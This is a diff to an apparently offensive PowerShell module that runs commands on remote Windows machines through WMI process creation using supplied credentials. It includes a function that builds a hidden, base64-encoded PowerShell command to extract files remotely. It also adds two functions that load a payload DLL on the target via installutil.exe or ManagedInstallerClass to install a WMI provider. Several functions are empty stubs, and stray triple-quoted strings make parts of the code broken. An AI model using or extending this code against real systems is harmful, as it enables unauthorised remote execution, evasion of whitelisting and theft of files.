@@ -81,7 +81,6 @@ Function Invoke-WMIRemoteExtract {
         $Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$InvokeRetrieveFile; $ConvertFromBase64; $Command1; $Command2;"))
         $RemoteCommand = "powershell.exe -NoP -NonI -Hidden -EncodedCommand $Base64"
     } Process {
-        #$RemoteCommand | Invoke-Expression 
         Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
     } End { 
     }
@@ -117,13 +116,14 @@ Function Install-WMIProviderMethod {
     } Process {
         
     } End { 
+
     }
 }
 
 ################################################################################
 # Extract file remotely
 ################################################################################
-Function Install-WMIProvider {
+Function Install-WMIProviderManual {
 <#
 	.SYNOPSIS
 	
@@ -147,13 +147,95 @@ Function Install-WMIProvider {
         [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
             [string]$ClassName = "WMIFS",
         [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Destination = "$env:windir\system32\wbem\"
+            [string]$Library = "$env:windir\system32\wbem\"
     )
     Begin {
         $InParameters = New-Parameters -Direction In
         $OutParameters = New-Parameters -Direction Out
     } Process {
         
+    } End { 
+        
+    }
+}
+
+################################################################################
+# Extract file remotely
+################################################################################
+Function Install-WMIProviderInstallUtil {
+<#
+	.SYNOPSIS
+	
+	.PARAMETER Target
+    
+    .PARAMETER Payload
+
+    .PARAMETER ClassName
+
+    .PARAMETER Destination
+	
+	.EXAMPLE
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Target = ".",
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Payload,
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$ClassName = "WMIFS",
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Library = "$env:windir\system32\wbem\"
+    )
+    Begin {
+        $RemoteCommand = "`"powershell.exe -Command `"+[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()+`"installutil.exe /LogToConsole=false /LogFile $Library`""
+        '''
+        "powershell.exe -Command "+[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()+"installutil.exe /LogToConsole=false /LogFile test.dll"
+        '''
+    } Process {
+        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
+    } End { 
+        
+    }
+}
+
+################################################################################
+# Extract file remotely
+################################################################################
+Function Install-WMIProviderPowerShell {
+<#
+	.SYNOPSIS
+	
+	.PARAMETER Target
+    
+    .PARAMETER Payload
+
+    .PARAMETER ClassName
+
+    .PARAMETER Destination
+	
+	.EXAMPLE
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Target = ".",
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Payload,
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$ClassName = "WMIFS",
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
+            [string]$Library = "$env:windir\system32\wbem\"
+    )
+    Begin {
+        $RemoteCommand = "`"powershell.exe -Command `"+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@($Library))"
+        '''
+        "powershell.exe -Command "+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@(test.dll))
+        '''
+    } Process {
+        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
     } End { 
         
     }
